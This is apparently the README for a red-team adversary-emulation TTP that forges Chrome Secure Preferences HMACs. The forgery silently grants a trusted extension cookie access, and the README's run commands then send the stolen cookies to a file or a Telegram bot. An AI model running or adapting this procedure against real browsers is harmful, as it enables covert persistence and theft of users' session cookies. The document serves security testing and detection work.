# Chrome Secure Preferences Hijack

> **NOTE:** This TTP does not include any cleanup steps. It is expected that the user will manually clean up the changes made to the Chrome Secure Preferences file. This can be done by removing the extension from Chrome, reverting it to its original state.

This TTP exploits a vulnerability in Chrome's Secure Preferences file to silently and persistently
modify a Chrome extension, granting it additional permissions to access cookies and other sensitive data.

The vulnerability exists because Chrome uses an easily computed seed value for HMAC calculation to protect the Secure Preferences file. By using this seed, an attacker can calculate valid HMAC values for modified preferences, effectively bypassing the browser's security mechanisms.

This version uses a single Python script that handles all three steps:
1. Kills Chrome
2. Modify Chrome files
3. Restart Chrome and exfiltrate cookies (locally by dumping to a file or via telegram by sending cookies to Telegram bot)

The default extension used in this TTP is Microsoft Editor: Spelling & Grammar Checker: https://chromewebstore.google.com/detail/microsoft-editor-spelling/gpaiobkfhnonedkhhfjpmhdalgeoebfa

Reference: https://syntax-err0r.github.io/Return_Of_The_Extension.html

Reference: https://www.cse.chalmers.se/~andrei/cans20.pdf

## Arguments
> Note: main.py is the main script that handles the TTP.

> The script is designed to parse several command line arguments that can be used to customize the behavior of the TTP, and the TTP yaml file can also be edited to account for these arguments for automation purposes.

- **id**: (required) string variable that contains the extension ID to modify (e.g., `gpaiobkfhnonedkhhfjpmhdalgeoebfa` for Microsoft Editor)

- **wait_time**: time to wait before killing Chrome (default: 15)

- **kill-after**: kill Chrome after waiting (default: leave Chrome running)

- **wait-time**: time to wait before killing Chrome if --kill-after is used (seconds) (default: 15)

- **telegram-token**: token for the Telegram bot (default: None)

- **telegram-chat-id**: chat ID for the Telegram bot and cookie exfiltration (default: None)

- **exfil_method**: method for exfiltrating cookies. Options: local (save to file) or telegram (send to Telegram bot). (default: "local")

## Examples
You can run the TTP using the following example (after updating the arguments):
```bash
ttpforge run forgearmory//persistence/chrome-secure-preferences-hijack/chrome-secure-preferences-hijack.yaml --arg id=gpaiobkfhnonedkhhfjpmhdalgeoebfa
```
```bash
ttpforge run forgearmory//persistence/chrome-secure-preferences-hijack/chrome-secure-preferences-hijack.yaml --arg id=gpaiobkfhnonedkhhfjpmhdalgeoebfa --arg wait_time=15
```

# Steps
1. **exploit_chrome**: Exploits Chrome's Secure Preferences file to silently and persistently modify a Chrome extension, granting additional permissions to access cookies

## Manual Reproduction
```bash
# Run the main.py script with the specified arguments for telegram cookie exfiltration

src/main.py --id=gpaiobkfhnonedkhhfjpmhdalgeoebfa --wait-time=15 --exfil_method=telegram --telegram-token=<YOUR_TOKEN> --telegram-chat-id=<YOUR_CHAT_ID>
```

## MITRE ATT&CK Mapping
- **Tactics**:
    - TA0003: Persistence
- **Techniques**:
    - T1176: Software Extensions
- **Subtechniques**:
    - T1176.001: Software Extensions: Browser Extensions
